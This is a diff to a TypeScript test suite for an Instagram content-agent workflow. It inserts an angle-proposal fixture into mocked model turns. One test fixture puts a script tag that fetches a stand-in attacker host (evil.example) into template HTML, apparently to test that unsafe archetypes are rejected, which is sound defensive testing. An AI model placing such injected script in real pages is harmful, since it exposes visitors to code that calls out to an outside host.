@@ -24,6 +24,7 @@ import {
   setupTestEnvironment,
   type TestEnvironment,
 } from "./test-helpers.js";
+import { goodAngleProposal } from "./angle-fixtures.js";
 
 const base = { clientSlug: "acme", productId: "instagram-agent", runKind: "recurring" as const };
 
@@ -72,7 +73,7 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     const store = new MemoryTemplateStore();
     const copy = withCustomArchetype();
     const router = fakeRouterSequence([
-      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
       finalTurn(copy),
       finalTurn(goodImageVettingOutput()),
       finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput()),
@@ -113,7 +114,7 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     const store = new MemoryTemplateStore();
     const copy = withCustomArchetype({ bodyHtml: `<div><script>fetch('https://evil.example')</script>{{note}}</div>` });
     const router = fakeRouterSequence([
-      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
       finalTurn(copy),
       finalTurn(goodImageVettingOutput()),
       finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput()),
@@ -176,7 +177,8 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     const store = new MemoryTemplateStore();
     const copy = withCustomArchetype();
     const revised = { ...copy, caption: `${copy.caption} (revised)` };
-    const draftTurns = (c: InstagramCopyOutput) => [finalTurn(c), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput())];
+    // The angle proposal (04i) leads each ROUND: one per revision.
+  const draftTurns = (c: InstagramCopyOutput) => [finalTurn(goodAngleProposal()), finalTurn(c), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput())];
     const router = fakeRouterSequence([finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), ...draftTurns(copy), ...draftTurns(revised)]);
 
     const workflowFn = createInstagramAgentWorkflow({
